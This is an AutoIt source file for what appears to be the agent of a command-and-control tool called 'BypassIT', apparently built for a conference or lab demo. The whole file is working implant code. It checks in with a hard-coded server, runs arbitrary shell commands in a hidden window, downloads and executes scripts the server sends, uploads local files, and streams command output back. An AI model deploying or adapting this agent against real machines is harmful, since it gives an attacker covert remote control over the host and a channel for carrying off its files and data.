#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile_type=a3x
#AutoIt3Wrapper_Outfile=C:\Users\defcon\Desktop\bypassit-agent3.a3x
#AutoIt3Wrapper_Add_Constants=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
; *** Start added by AutoIt3Wrapper ***
#include <AutoItConstants.au3>
#include <FileConstants.au3>
; *** End added by AutoIt3Wrapper ***

; Predefined variables
Global $BypassIT_Server_IP = "10.0.2.13"
Global $MsgPort = 5074
Global $FilePort = 5075
Global $sSerial = 1892
Global $CheckinInterval = 10000  ; Default check-in interval in milliseconds
Global $Recv, $RecvArray, $timeout
Global $LogFile = @ScriptDir & "\log.txt"
Global $WorkingDir = @ScriptDir  ; Default working directory
Global $g_bHasStreamed = False

; Function to write logs to a file
Func WriteLog($message)
    Local $hFile = FileOpen($LogFile, 1)
    If $hFile = -1 Then
        MsgBox(0, "Error", "Unable to open log file.")
        Return
    EndIf
    FileWriteLine($hFile, @YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC & " - " & $message)
    FileClose($hFile)
EndFunc

; TCP Connectivity Test
TCPStartup()
$Socket = TCPConnect($BypassIT_Server_IP, $MsgPort)
If $Socket = -1 Then
    MsgBox(0, "Connectivity Test", "Failed to connect to " & $BypassIT_Server_IP & ":" & $MsgPort)
    WriteLog("Failed to connect to " & $BypassIT_Server_IP & ":" & $MsgPort)
    Exit
Else
    MsgBox(0, "Connectivity Test", "Successfully connected to " & $BypassIT_Server_IP & ":" & $MsgPort)
    WriteLog("Successfully connected to " & $BypassIT_Server_IP & ":" & $MsgPort)
    TCPCloseSocket($Socket)
EndIf
TCPShutdown()

; Register with the server
SendMsg("register|" & $sSerial & "|" & @ComputerName, -1)
WriteLog("Registration sent.")

; Main loop for checking in
While 1
    ; Check in with Agent_ID and await queued action
    SendMsg("request_action|" & $sSerial, 10000)

    Switch $RecvArray[1]
        Case "new_checkin_interval"
            $CheckinInterval = Number($RecvArray[2])
            WriteLog("Server requesting new checkin interval of " & $CheckinInterval / 1000 & " seconds")

        Case "download_file"
            If $RecvArray[0] >= 2 Then
                $filename = $RecvArray[2]
                WriteLog("Attempting to download file: " & $filename)
                If Not _ReceiveFile($WorkingDir, $filename) Then
                    WriteLog("File download failed: " & $filename)
                    SendMsg("download_failed|" & $sSerial & "|" & $filename)
                    DiagnosticInfo()
                Else
                    SendMsg("download_complete|" & $sSerial & "|" & $filename)
                    WriteLog("File download completed: " & $filename)

                    ; Execute the downloaded script
					If StringRight($filename, 4) = ".a3x" Then
						WriteLog("Attempting to execute downloaded script: " & $filename)
						$scriptPath = $WorkingDir & "\" & $filename
						$outputFile = $WorkingDir & "\output.txt"

						; Create the output file if it doesn't exist
						$hFile = FileOpen($outputFile, 2 + 8) ; 2 = write mode, 8 = create if not exist
						If $hFile <> -1 Then
							FileClose($hFile)
						Else
							WriteLog("Failed to create output file: " & $outputFile)
							ContinueLoop
						EndIf

						ExecuteAndStreamScript($scriptPath, $outputFile)
						; Reset the streaming flag after execution
						$g_bHasStreamed = False
					EndIf
                EndIf
            Else
                WriteLog("Error: Invalid download_file command format")
            EndIf

        Case "upload_file"
            If $RecvArray[0] >= 2 Then
                $LocalFile = $RecvArray[2]
                WriteLog("Attempting to upload file: " & $LocalFile)
                _SendFile($LocalFile)
            Else
                WriteLog("Error: Invalid upload_file command format")
            EndIf

        Case "execute_command"
            If $RecvArray[0] >= 2 Then
                $command = $RecvArray[2]
                WriteLog("Attempting to execute command: " & $command)

                ; Use @ComSpec to run the command and redirect output and error to a file
                $pid = Run(@ComSpec & " /c " & $command & " > """ & @ScriptDir & "\output.txt"" 2>&1", @WorkingDir, @SW_HIDE)

                If $pid = 0 Then
                    WriteLog("Failed to execute command: " & $command)
                    WriteLog("Possible reasons: command not found, insufficient permissions, invalid command syntax, or environmental issues.")
                    WriteLog("Check if the command is correct and available in the system PATH.")
                Else
                    Sleep(1000) ; Wait briefly for the command to execute
                    $output = FileRead(@ScriptDir & "\output.txt")
                    WriteLog("Command executed successfully: " & $command & " (PID: " & $pid & ")")
                    WriteLog("Command Output: " & $output)
                EndIf
            Else
                WriteLog("Error: Invalid execute_command format")
            EndIf

        Case "no_pending_commands"
            ; Do nothing, this is an expected response

        Case Else
            WriteLog("Unknown command received: " & $RecvArray[1])
	EndSwitch



	SendMsg("checkin|" & $sSerial)

    Sleep($CheckinInterval)
WEnd

Func SendMsg($message, $timeout = 60000)
    $retry = 0
    While 1
        TCPStartup()
        $CmdSocket = TCPConnect($BypassIT_Server_IP, $MsgPort)
        If @error Or $CmdSocket = -1 Then
            If $retry = 5 Then
                WriteLog("Lost connection to server, retrying in 1 minute...")
                Sleep(60000)
            Else
                WriteLog("Could not connect to server, retrying in 1 second...")
                Sleep(1000)
                $retry += 1
            EndIf
        Else
            If $retry > 0 Then WriteLog("Connection to server successful.")
            TCPSend($CmdSocket, $message)
            Do
                $Recv = TCPRecv($CmdSocket, 1000)
                Sleep(100)
            Until $Recv <> ""

            $RecvArray = StringSplit($Recv, "|")

            TCPCloseSocket($CmdSocket)
            TCPShutdown()
            ExitLoop
        EndIf
    WEnd
EndFunc   ;==>SendMsg

Func _SendFile($LocalFile)
    Local $BytesRead = 0
    Local Const $FILE_BEGIN = 0 ; Define the constant for file seek origin

    ;Get file size
    $iFileSize = FileGetSize($LocalFile)

    ;Get file name
    $Reg = StringRegExp($LocalFile, "(.)+\\((.)+)?", 3)
    Select
        Case Not IsArray($Reg)
            $FileName = $Reg
        Case UBound($Reg) < 2
            Return SetError(2, 0, -1)
        Case Else
            $FileName = $Reg[UBound($Reg)-1]
    EndSelect

    ;Initiate TCP session
    TCPStartup()
    $FileSocket = TCPConnect($BypassIT_Server_IP, $FilePort)

    ;Seq1: Wait until server replies
    Do
        $Receive = TCPRecv($FileSocket, 1000)
        Sleep(10)
    Until $Receive <> ""

    ;Seq2: Send transfer direction, filename and file size to server
    WriteLog("Sending file request: from_agent|" & $FileName)
    TCPSend($FileSocket, "from_agent|" & $FileName & "|" & $iFileSize)

    ;Open file to read in binary
    $FileHandle = FileOpen($LocalFile, 16)

    ;Seq3: Wait until server replies with "Start Upload"
    Do
        $Receive = TCPRecv($FileSocket, 1000)
    Until $Receive <> ""

    ;Seq4: Loop sending file in chunks as binary until size exceeds offset
    Local $iOffset = 0
    Do
        FileSetPos($FileHandle, $iOffset, $FILE_BEGIN)
        TCPSend($FileSocket, FileRead($FileHandle, 4096))
        $iOffset += 4096
    Until $iOffset >= $iFileSize

    ;Seq5: Send "End of file" to finish transfer and close socket
    TCPSend($FileSocket, @CRLF & "{EOF}")
    FileClose($FileHandle)
    TCPCloseSocket($FileSocket)
    TCPShutdown()
    WriteLog("File upload completed: " & $FileName)
EndFunc   ;==>_SendFile

Func _ReceiveFile($LocalPath, $ServerFile)
    WriteLog("Starting file download process for: " & $ServerFile)

    Local $retryCount = 0
    Local $maxRetries = 3

    While $retryCount < $maxRetries
        TCPStartup()
        $FileSocket = TCPConnect($BypassIT_Server_IP, $FilePort)
        If @error Then
            $retryCount += 1
            WriteLog("Error connecting to file transfer port: " & @error & ". Retry " & $retryCount & " of " & $maxRetries)
            TCPShutdown()
            If $retryCount < $maxRetries Then
                Sleep(2000)
                ContinueLoop
            Else
                WriteLog("Failed to connect after " & $maxRetries & " attempts")
                Return False
            EndIf
        EndIf
        WriteLog("Connected to file transfer port")

        ; Wait for READY signal
        $Receive = TCPRecv($FileSocket, 1024)
        If $Receive <> "READY" Then
            WriteLog("Did not receive READY signal, got: " & $Receive)
            TCPCloseSocket($FileSocket)
            TCPShutdown()
            ContinueLoop
        EndIf
        WriteLog("Received READY signal from server")

        ; Send file request
        WriteLog("Sending file request: to_agent|" & $ServerFile)
        TCPSend($FileSocket, "to_agent|" & $ServerFile)

        ; Wait for file info
        $Receive = TCPRecv($FileSocket, 1024)
        WriteLog("Received from server: " & $Receive)

        $FileData = StringSplit($Receive, "|", 2)
        If @error Or UBound($FileData) < 2 Then
            WriteLog("Invalid file info received from server")
            TCPCloseSocket($FileSocket)
            TCPShutdown()
            ContinueLoop
        EndIf

        $FileName = $FileData[0]
        $FileSize = Number($FileData[1])

        $LocalFilePath = $LocalPath & "\" & $FileName
        $FileHandle = FileOpen($LocalFilePath, 18) ; 2 (overwrite) + 16 (binary)
        If $FileHandle = -1 Then
            WriteLog("Failed to open local file for writing: " & $LocalFilePath)
            TCPCloseSocket($FileSocket)
            TCPShutdown()
            Return False
        EndIf

        ; Send START signal
        TCPSend($FileSocket, "START")

        ; Receive file data
        $ReceivedSize = 0
        While $ReceivedSize < $FileSize
            $Data = TCPRecv($FileSocket, 4096)
            If @error Then
                WriteLog("Error receiving file data: " & @error)
                FileClose($FileHandle)
                TCPCloseSocket($FileSocket)
                TCPShutdown()
                Return False
            EndIf
            FileWrite($FileHandle, $Data)
            $ReceivedSize += BinaryLen($Data)
        WEnd

        FileClose($FileHandle)
        TCPCloseSocket($FileSocket)
        TCPShutdown()
        WriteLog("File download completed: " & $ServerFile)
        Return True
    WEnd

    WriteLog("File download failed after " & $maxRetries & " attempts")
    Return False
EndFunc

Func DiagnosticInfo()
    WriteLog("--- Diagnostic Information ---")
    WriteLog("Server IP: " & $BypassIT_Server_IP)
    WriteLog("Message Port: " & $MsgPort)
    WriteLog("File Port: " & $FilePort)

    ; Test connection to message port
    TCPStartup()
    $testSocket = TCPConnect($BypassIT_Server_IP, $MsgPort)
    If @error Then
        WriteLog("Cannot connect to message port: " & @error)
    Else
        WriteLog("Successfully connected to message port")
        TCPCloseSocket($testSocket)
    EndIf

    ; Test connection to file port
    $testSocket = TCPConnect($BypassIT_Server_IP, $FilePort)
    If @error Then
        WriteLog("Cannot connect to file port: " & @error)
    Else
        WriteLog("Successfully connected to file port")
        TCPCloseSocket($testSocket)
    EndIf

    TCPShutdown()

    ; Check if firewall is blocking AutoIt
    $firewallStatus = Run(@ComSpec & " /c netsh advfirewall show allprofiles state", "", @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
    $firewallOutput = StdoutRead($firewallStatus)
    WriteLog("Firewall Status: " & $firewallOutput)

    WriteLog("--- End of Diagnostic Information ---")
EndFunc

Func ExecuteAndStreamScript($scriptPath, $outputFile)
    ; Run the script and capture its output
    $pid = Run(@AutoItExe & " /AutoIt3ExecuteScript """ & $scriptPath & """ > """ & $outputFile & """ 2>&1", $WorkingDir, @SW_HIDE)
    If $pid = 0 Then
        WriteLog("Failed to execute script: " & $scriptPath)
        Return False
    EndIf

    WriteLog("Script execution started: " & $scriptPath & " (PID: " & $pid & ")")

    ; Wait for the process to finish
    While ProcessExists($pid)
        Sleep(100)
    WEnd

    WriteLog("Script execution finished: " & $scriptPath)

    ; Now stream the contents
    SendMsg("start_streaming|" & $sSerial)
    StreamOutput($outputFile)

    ; Set the flag to indicate streaming has occurred
    $g_bHasStreamed = True

    Return True
EndFunc

Func StreamOutput($filename)
    Local $hFile = FileOpen($filename, 0) ; Open for reading
    If $hFile = -1 Then
        WriteLog("Unable to open output file for streaming: " & $filename)
        Return
    EndIf

    Local $content = FileRead($hFile)
    FileClose($hFile)

    ; Stream content in small chunks
    Local $chunkSize = 50 ; Adjust this value to control streaming speed
    Local $length = StringLen($content)
    Local $position = 1

    While $position <= $length
        Local $chunk = StringMid($content, $position, $chunkSize)
        SendMsg("stream_output|" & $sSerial & "|" & $chunk)
        $position += $chunkSize
        Sleep(100) ; Adjust this value to control streaming speed
    WEnd

    SendMsg("stop_streaming|" & $sSerial)
    WriteLog("Finished streaming output for: " & $filename)
EndFunc
